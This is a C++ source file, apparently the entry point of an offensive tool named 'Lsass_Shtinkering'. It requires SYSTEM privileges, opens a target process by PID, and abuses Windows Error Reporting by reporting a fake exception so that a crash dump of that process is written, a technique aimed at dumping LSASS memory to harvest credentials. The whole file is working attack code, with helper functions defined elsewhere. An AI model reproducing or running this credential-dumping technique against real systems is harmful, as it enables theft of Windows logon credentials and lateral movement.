#include "Lsass_Shtinkering.h"

int main(int argc, char* argv[])
{

	DWORD processPid;
	HANDLE processHandle;

	try
	{
		if (argc != 2)
		{
			wcout << L"Usage: " << argv[0] << " <PID>" << endl;
			return 0;
		}
		if (IsLocalSystem())
			wcout << L"process runs as NT AUTHORITY\\SYSTEM" << endl;
		else
		{
			wcout << L"process must run as NT AUTHORITY\\SYSTEM" << endl;
			return 0;
		}
		processPid = atoi(argv[1]);
		processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, TRUE, processPid);

		wcout << L"[*] Reporting exception on PID: 0x" << std::hex << processPid << endl;
		ReportExceptionToWer(processPid, processHandle);
		wcout << L"[V] Exception reported successfully!" << endl;
		PrintCrashDampLocation();
	}
	catch (std::exception& exception)
	{
		wcout << L"[X] Error: " << exception.what() << endl;
	}
	
}
